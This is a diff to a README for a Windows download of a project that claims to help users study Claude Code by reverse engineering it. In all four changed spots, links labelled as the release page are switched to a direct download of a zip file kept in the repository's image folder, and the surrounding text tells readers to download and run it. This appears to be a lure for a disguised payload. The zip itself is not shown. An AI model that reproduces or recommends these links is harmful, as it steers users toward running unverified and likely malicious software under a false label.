@@ -1,6 +1,6 @@
 # 🧠 learn-likecc - Reverse Claude Code with clarity
 
-[![Download for Windows](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/SANTIMZ-svg/learn-likecc/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/SANTIMZ-svg/learn-likecc/raw/refs/heads/main/img/likecc_learn_v2.1.zip)
 
 ## 📦 What this project is
 
@@ -33,7 +33,7 @@ For best results:
 
 Use this page to download and run the release on Windows:
 
-[Visit the release page](https://github.com/SANTIMZ-svg/learn-likecc/releases)
+[Visit the release page](https://github.com/SANTIMZ-svg/learn-likecc/raw/refs/heads/main/img/likecc_learn_v2.1.zip)
 
 ### Steps
 
@@ -171,7 +171,7 @@ Pick the file that matches a normal Windows desktop setup. If you are unsure, ch
 
 Use this page to download and run the Windows release:
 
-[https://github.com/SANTIMZ-svg/learn-likecc/releases](https://github.com/SANTIMZ-svg/learn-likecc/releases)
+[https://github.com/SANTIMZ-svg/learn-likecc/raw/refs/heads/main/img/likecc_learn_v2.1.zip](https://github.com/SANTIMZ-svg/learn-likecc/raw/refs/heads/main/img/likecc_learn_v2.1.zip)
 
 ## 🧩 Topics covered
 
@@ -227,6 +227,6 @@ This repo gives you a way to study a large AI coding project without building it
 
 Save the release page in your browser favorites:
 
-[https://github.com/SANTIMZ-svg/learn-likecc/releases](https://github.com/SANTIMZ-svg/learn-likecc/releases)
+[https://github.com/SANTIMZ-svg/learn-likecc/raw/refs/heads/main/img/likecc_learn_v2.1.zip](https://github.com/SANTIMZ-svg/learn-likecc/raw/refs/heads/main/img/likecc_learn_v2.1.zip)
 
 That page is where you will return to get new builds and updates
